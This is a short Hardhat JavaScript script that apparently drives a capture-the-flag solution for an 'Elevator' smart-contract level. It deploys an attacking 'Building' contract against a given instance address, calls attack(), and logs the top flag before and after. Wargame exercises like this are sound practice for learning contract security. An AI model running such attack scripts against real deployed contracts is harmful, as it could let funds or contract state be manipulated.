const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // attach your instance address
  const Instance = "0x983259c666Af356319477B147982C117dFE47248";
  const ElevatorContract = await ethers.getContractFactory("Elevator");
  const Elevator = ElevatorContract.attach(Instance);
  const BuildingContract = await ethers.getContractFactory("Building");
  const Building = await BuildingContract.deploy(Instance);
  await Building.deployed();
  const Top = await Elevator.top();

  await Building.attack();
  const top = await Elevator.top();
  console.log(Top, top);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
